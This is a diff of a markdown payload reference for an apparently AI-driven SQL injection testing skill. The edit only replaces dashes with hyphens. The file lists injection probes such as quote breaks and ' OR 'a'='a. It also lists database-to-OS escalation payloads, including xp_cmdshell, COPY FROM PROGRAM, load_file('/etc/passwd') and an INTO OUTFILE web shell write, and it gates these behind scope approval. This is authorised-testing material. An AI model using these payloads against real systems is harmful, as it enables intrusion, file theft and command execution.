@@ -1,9 +1,8 @@
-# payloads — sqli-hunter
+# payloads - sqli-hunter
 
 **Source:** `pentest-agent-development/notebooklm-notes/Guia Compreensivo de Auditoria e Testes de SQL Injection.md` (Section 5: PAYLOADS / PROBES)
 
-Probes are organized by goal. All examples use read-only test commands —
-`sleep`, `version()`, and `UNION SELECT NULL`. Do NOT substitute
+Probes are organized by goal. All examples use read-only test commands - `sleep`, `version()`, and `UNION SELECT NULL`. Do NOT substitute
 destructive DDL or `DROP`/`TRUNCATE` payloads without explicit
 `destructive_testing: approved` in `security-scope.yaml`.
 
@@ -12,8 +11,8 @@ destructive DDL or `DROP`/`TRUNCATE` payloads without explicit
 ## Syntactic Probes (confirm input reaches SQL)
 
 ```
-'                      # single quote — most common break
-"                      # double quote — some backends
+'                      # single quote - most common break
+"                      # double quote - some backends
 ;                      # statement terminator
 \'                     # escaped quote (test filter evasion)
 ' OR 'a'='a
@@ -214,11 +213,11 @@ These appear in the source as RCE/OS-access paths. They are listed for
 awareness; do not submit without explicit `destructive_testing: approved`
 in `security-scope.yaml`:
 
-- `xp_cmdshell 'whoami'` (MSSQL — requires privileged DB user)
-- `SELECT * FROM openrowset(...)` (MSSQL — file-system access)
-- `COPY ... FROM PROGRAM '...'` (PostgreSQL — OS command)
-- `SELECT load_file('/etc/passwd')` (MySQL — file read; `FILE` privilege)
-- `INTO OUTFILE '/var/www/html/shell.php'` (MySQL — file write)
+- `xp_cmdshell 'whoami'` (MSSQL - requires privileged DB user)
+- `SELECT * FROM openrowset(...)` (MSSQL - file-system access)
+- `COPY ... FROM PROGRAM '...'` (PostgreSQL - OS command)
+- `SELECT load_file('/etc/passwd')` (MySQL - file read; `FILE` privilege)
+- `INTO OUTFILE '/var/www/html/shell.php'` (MySQL - file write)
 
 Detection of one of these paths is already a Critical finding; exploitation
 is gated.
@@ -240,6 +239,6 @@ ffuf -w /usr/share/wordlists/sqli/Generic-SQLi.txt:F \
 ```
 
 Note: `sqlmap` is deliberately not in the tool allow-list for this skill
-(see `validate-skills.sh` forbidden-tools check) — sqlmap is destructive
+(see `validate-skills.sh` forbidden-tools check) - sqlmap is destructive
 by default. Confirm-only with curl/ffuf, then escalate to `/security/pentest`
 for Shannon-controlled exploitation.
